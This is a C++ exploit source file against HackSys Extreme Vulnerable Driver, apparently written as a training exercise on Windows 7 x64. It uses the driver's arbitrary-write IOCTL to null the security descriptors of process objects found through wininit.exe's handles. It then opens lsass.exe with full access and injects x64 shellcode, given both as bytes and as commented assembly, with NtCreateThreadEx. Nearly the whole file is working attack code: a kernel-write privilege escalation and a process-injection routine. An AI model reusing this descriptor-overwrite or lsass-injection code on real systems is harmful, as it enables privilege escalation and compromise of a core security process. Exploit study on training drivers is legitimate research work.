#include<iostream>
#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <Tlhelp32.h>
#include <unordered_map>
#include <iterator>
#include "../HEVDExploit/helper.h"

#pragma comment(lib,"ntdll.lib")
#define MaxCount  1024
#define TypeIndexProcess 7

typedef struct data {
	ULONG64 what;
	ULONG64 where;
}DATA;

typedef DWORD(WINAPI* _NtQueryIntervalProfile)(DWORD, PULONG);

typedef struct SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
}SYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO handles[ANYSIZE_ARRAY];
}SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;


struct NtCreateThreadExBuffer
{
	ULONG Size;
	ULONG Unknown1;
	ULONG Unknown2;
	PULONG Unknown3;
	ULONG Unknown4;
	ULONG Unknown5;
	ULONG Unknown6;
	PULONG Unknown7;
	ULONG Unknown8;
};

typedef NTSTATUS(WINAPI* _NtCreateThreadEx)
(
	OUT PHANDLE hThread,
	IN ACCESS_MASK DesiredAccess,
	IN LPVOID ObjectAttributes,
	IN HANDLE ProcessHandle,
	IN LPTHREAD_START_ROUTINE lpStartAddress,
	IN LPVOID lpParameter,
	IN BOOL CreateSuspended,
	IN ULONG StackZeroBits,
	IN ULONG SizeOfStackCommit,
	IN ULONG SizeOfStackReserve,
	OUT LPVOID pAttrListOut
	);

int injectCode(DWORD pid) {
	HMODULE modNtDll = GetModuleHandle(L"ntdll.dll");
	if (!modNtDll) {
		printf("Failed to get module handle for ntdll.dll, Error=0x%.8x\n", GetLastError());
		return -1;
	}
	_NtCreateThreadEx NtCreateThreadEx =
		(_NtCreateThreadEx)GetProcAddress(modNtDll, "NtCreateThreadEx");

	if (!NtCreateThreadEx)
	{
		printf("\n failed to get funtion address from ntdll.dll, Error=0x%.8x", GetLastError());
		return -1;
	}

	HANDLE hProcess;
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (hProcess == NULL) {
		printf("Failed to open handle to lsass.exe\n");
		return 0;
	}

	char shellcode[] =
		"\x90\x90\x90"
		"\x31\xC0\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x8B\x40\x18\x48\x83\xC0\x20\x48\x8B\x00\x48\x8B\x00\x4C\x8B\x70\x20\x48\x8B\x00\x4C\x8B\x78\x20\x4C\x89\xF8\x48\x31\xDB\x8B\x58\x3C\x48\x01\xC3\x31\xC9\x8B\x8B\x88\x00\x00\x00\x48\x01\xC1\x31\xDB\x31\xD2\x31\xED\x8B\x59\x1C\x8B\x51\x20\x48\x01\xC2\x49\xBB\x64\x64\x72\x65\x73\x73\x00\x00\x41\x53\x49\xBB\x47\x65\x74\x50\x72\x6F\x63\x41\x41\x53\x4D\x31\xC0\x31\xC9\x48\x89\xE6\x48\x89\xD7\x42\x8B\x3C\x87\x48\x01\xC7\x66\x83\xC1\x0E\xF3\xA6\x74\x05\x49\xFF\xC0\xEB\xE4\x48\x01\xC3\x42\x8B\x1C\x83\x48\x01\xC3\x49\xC7\xC3\x6C\x65\x41\x00\x41\x53\x49\xBB\x43\x72\x65\x61\x74\x65\x46\x69\x41\x53\x4C\x89\xF9\x48\x89\xE2\x4D\x31\xDB\x41\x53\x41\x53\x41\x53\x41\x53\xFF\xD3\x49\x89\xC4\x49\xC7\xC3\x64\x00\x00\x00\x41\x53\x49\xBB\x73\x65\x72\x54\x68\x72\x65\x61\x41\x53\x49\xBB\x52\x74\x6C\x45\x78\x69\x74\x55\x41\x53\x4C\x89\xF1\x48\x89\xE2\x4D\x31\xDB\x41\x53\x41\x53\x41\x53\x41\x53\xFF\xD3\x49\x89\xC5\x4D\x31\xDB\x41\x53\x49\xBB\x77\x73\x5C\x70\x77\x6E\x65\x64\x41\x53\x49\xBB\x43\x3A\x5C\x57\x69\x6E\x64\x6F\x41\x53\x48\x89\xE1\x48\xBA\x00\x00\x00\xC0\x00\x00\x00\x00\x4D\x31\xC0\x41\x50\x49\xC7\xC0\x80\x00\x00\x00\x41\x50\x49\xC7\xC0\x01\x00\x00\x00\x41\x50\x4D\x31\xC0\x4D\x31\xC9\x41\x50\x41\x50\x41\x50\x41\x50\x41\xFF\xD4\x31\xC9\x41\xFF\xD5\xC3"
		"\x90\x90\x90";

	char* rBuffer = (char*)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (rBuffer == NULL) {
		printf("VirtualAlloc failed\n");
		return -1;
	}

	ULONG64 nIn;
	printf("Injecting to lsass.exe: %d\n", pid);
	if (!WriteProcessMemory(hProcess, rBuffer, shellcode, sizeof(shellcode), &nIn)) {
		printf("WriteProcessMemory Failed, bytes written = %d\n", (int)nIn);
		return 0;
	}

	/*
		NtCreateThreadEx is not documented.
	*/
	NtCreateThreadExBuffer ntbuffer;
	memset(&ntbuffer, 0, sizeof(NtCreateThreadExBuffer));
	DWORD temp1 = 0;
	DWORD temp2 = 0;

	ntbuffer.Size = sizeof(NtCreateThreadExBuffer);
	ntbuffer.Unknown1 = 0x10003;
	ntbuffer.Unknown2 = 0x8;
	ntbuffer.Unknown3 = &temp2;
	ntbuffer.Unknown4 = 0;
	ntbuffer.Unknown5 = 0x10004;
	ntbuffer.Unknown6 = 4;
	ntbuffer.Unknown7 = &temp1;
	ntbuffer.Unknown8 = 0;

	HANDLE rThread;
	NTSTATUS status = NtCreateThreadEx(
		&rThread,
		0x1FFFFF,
		NULL,
		hProcess,
		(LPTHREAD_START_ROUTINE)rBuffer,
		NULL,
		FALSE, //start instantly
		NULL,
		NULL,
		NULL,
		nullptr
	);
	if (rThread == NULL) {
		printf("\n NtCreateThreadEx failed, Error=0x%.8x", GetLastError());
		return -1;
	}

	WaitForSingleObject(rThread, INFINITE);

	return 0;
}

LPWSTR  pidToName(DWORD pid) {
	PROCESSENTRY32  ProcessEntry = { 0 };
	ProcessEntry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	Process32First(hSnap, &ProcessEntry);

	while (ProcessEntry.th32ProcessID != pid)
		Process32Next(hSnap, &ProcessEntry);

	return ProcessEntry.szExeFile;
}

int main() {
	NTSTATUS status;
	PSYSTEM_HANDLE_INFORMATION HandleInfo;

	HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_WRITE, FILE_SHARE_WRITE,
		nullptr, OPEN_EXISTING, 0,
		nullptr
	);
	if (hDevice == INVALID_HANDLE_VALUE) {
		return printf("Failed to open device\n");
	}

	HandleInfo = (PSYSTEM_HANDLE_INFORMATION)VirtualAlloc(NULL, 1024 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!HandleInfo) {
		printf("VirtualAlloc failed (%d)\n", GetLastError());
		return -1;
	}
	if (!NT_SUCCESS(status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, HandleInfo, 1024 * 1024, NULL))) {
		printf("NtQuerySystemInformation failed(%#x)\n", status);
		VirtualFree(HandleInfo, 0, MEM_RELEASE);
		return -1;
	}

	DWORD lsassPid;
	std::vector<ULONG64> wininitProcList;
	std::vector<ULONG64> lsm;
	std::vector<ULONG64> serv;

	/*
		It is not possible to get the exact EPROCESS address of lsass.exe in Windows 7 x64.
		But we can narrow it down to 3 possible values.
	*/
	for (int i = 0; i < HandleInfo->NumberOfHandles; i++) {
		/*
			Only EPROCESS objects	
		*/
		if (HandleInfo->handles[i].ObjectTypeIndex != TypeIndexProcess)
			continue;
		/*
			wininit.exe only spawns lsass.exe, winlogon.exe and services.exe.
			So it's handle table will contain three EPROCESS objects,
			one of them is lsass.exe.
		*/
		if (lstrcmpW(pidToName(HandleInfo->handles[i].UniqueProcessId), L"wininit.exe") == 0) {
			wininitProcList.insert(wininitProcList.end(), (ULONG64)HandleInfo->handles[i].Object);
		}
		/*
			Get pid of Lsass.exe
		*/
		if (lstrcmpW(pidToName(HandleInfo->handles[i].UniqueProcessId), L"lsass.exe") == 0) {
			lsassPid = HandleInfo->handles[i].UniqueProcessId;
		}
	}

	printf("Lsass.exe pid = %d\n", lsassPid);
	std::cout << "wininit.exe: " << std::endl;
	for (std::vector<ULONG64>::iterator it = wininitProcList.begin(); it != wininitProcList.end(); ++it)
		printf("%p\n", *it);
	std::cout << std::endl;

	ULONG64 what = 0x00;
	ULONG64 where = 0x00;
	DATA inp;
	inp.what = (ULONG64)&what;
	inp.where = 0x0;
	DWORD returned;
	/*
		We overwrite the Security_Descriptor with NULL
		Security_Descriptor is part of the Object_Header structure
		Process handles have Object_header at EPROCESS-0x30 
		Security_Descriptor is at EPROCESS-0x8 in Windows x64 and EPROCESS-0x4 in Windows x86
	*/
	for (std::vector<ULONG64>::iterator it = wininitProcList.begin(); it != wininitProcList.end(); ++it) {
		inp.where = (*it) - 8;
		BOOL success = DeviceIoControl(hDevice,
			HEVD_IOCTL_ARBITRARY_WRITE,
			&inp, 0x00,
			nullptr, 0,
			&returned, nullptr
		);
		if (!success) {
			printf("Failed\n");
			return 0;
		}
	}
	printf("Security Descriptor Overwritten\n");
	injectCode(lsassPid);

	CloseHandle(hDevice);
	return 0;
}

/* x64 Shellcode to CreateFile() and RtlExitThread() 
xor eax, eax
mov rax, [gs:0x60]
mov rax, [rax+0x18]
add rax, 0x20
mov rax, [rax]
mov rax, [rax]
mov r14, [rax+0x20]
mov rax, [rax]
mov r15, [rax+0x20]
mov rax, r15

xor    rbx,rbx
mov    ebx,DWORD PTR [rax+0x3c]
add    rbx,rax
xor    ecx,ecx
mov    ecx,DWORD PTR [rbx+0x88]
add    rcx,rax
xor    ebx,ebx
xor    edx,edx
xor    ebp,ebp
mov    ebx,DWORD PTR [rcx+0x1c]
mov    edx,DWORD PTR [rcx+0x20]
add    rdx,rax
movabs r11,0x737365726464
push   r11
movabs r11,0x41636f7250746547
push   r11
xor    r8,r8

loop:xor    ecx,ecx
mov    rsi,rsp
mov    rdi,rdx
mov    edi,DWORD PTR [rdi+r8*4]
add    rdi,rax
add    cx,0xe
repe cmpsb
je     end
inc    r8
jmp    loop

end:add   rbx,rax
mov    ebx,DWORD PTR [rbx+r8*4]
add    rbx,rax

mov r11,0x41656c
push   r11
mov r11,0x6946657461657243
push   r11
mov rcx, r15
mov rdx, rsp
xor r11, r11
push r11
push r11
push r11
push r11
call rbx
mov r12, rax

mov r11, 0x64
push r11
mov r11,0x6165726854726573
push   r11
mov r11,0x55746978456c7452
push   r11
mov rcx, r14
mov rdx, rsp
xor r11, r11
push r11
push r11
push r11
push r11
call rbx
mov r13, rax

xor r11, r11
push r11
mov r11, 0x64656e77705c7377
push r11
mov r11, 0x6f646e69575c3a43
push r11
mov rcx, rsp
mov rdx, 0xc0000000
xor r8, r8
push r8
mov r8, 0x80
push r8
mov r8, 0x1
push r8
xor r8, r8
xor r9, r9
push r8
push r8
push r8
push r8
call r12

xor ecx, ecx
call r13

ret

*/
